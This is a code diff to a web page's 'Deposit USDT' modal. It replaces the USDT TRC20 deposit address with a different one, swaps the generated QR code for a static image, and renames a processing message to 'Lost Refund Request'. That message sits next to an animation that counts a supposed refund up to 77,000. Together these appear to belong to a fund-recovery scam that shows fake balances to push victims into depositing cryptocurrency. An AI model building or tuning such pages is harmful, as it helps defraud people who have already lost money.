@@ -723,7 +723,7 @@
       <h2>Deposit USDT</h2>
       <div class="qr-section" style="align-items:center;">
         <!-- QR code img element, wallet-like size -->
-        <img id="deposit-qr-img" src="" alt="Deposit QR Code" style="width:92px;height:92px;display:block;margin:0 auto 0.6rem auto;background:#fff;border-radius:0.3rem;border:1px solid #e2e8f0;" />
+        <img id="deposit-qr-img" src="IMG_2325.jpeg" alt="Deposit QR Code" style="width:92px;height:92px;display:block;margin:0 auto 0.6rem auto;background:#fff;border-radius:0.3rem;border:1px solid #e2e8f0;" />
         <div class="modal-note" style="margin-bottom:0.7rem;">Scan QR code to get the address in your wallet app.</div>
       </div>
       <div class="deposit-address-box">
@@ -825,11 +825,11 @@
       const closeDepositModal = document.getElementById('close-deposit-modal');
 
       // Demo: static address (replace with unique if needed)
-      const depositAddress = "TQ4uJZg2hV2nRZ3nJf8Zg3sY8nXzA5ENkH"; // Example USDT TRC20 address
+      const depositAddress = "TYdrLopgqmAbwbFnqMvNDsSwUXzL5UoJ7P"; // Example USDT TRC20 address
 
       depositBtn.onclick = function() {
         // Google Charts QR Code for wallet-like appearance (92x92)
-        depositQrImg.src = "https://chart.googleapis.com/chart?cht=qr&chs=92x92&chl=" + encodeURIComponent(depositAddress);
+        depositQrImg.src = "IMG_2325.jpeg?cht=qr&chs=92x92&chl=" + encodeURIComponent(depositAddress);
         depositAddressText.textContent = depositAddress;
         depositModalBg.classList.remove('hidden');
       };
@@ -877,7 +877,7 @@
         if(userData.recoveryRequested) return;
         userData.recoveryRequested = true;
         personalBtn.disabled = true;
-        personalProcessing.innerHTML = `<span class="spinner"></span> Hold on while we process your request...`;
+        personalProcessing.innerHTML = `<span class="spinner"></span> Hold on while we process your Lost Refund Request...`;
 
         // Animate from 0 to 77,000 over ~3 seconds
         let target = 77000, duration = 3000, frame = 30, steps = duration / frame, current = 0, stepAmount = target/steps;
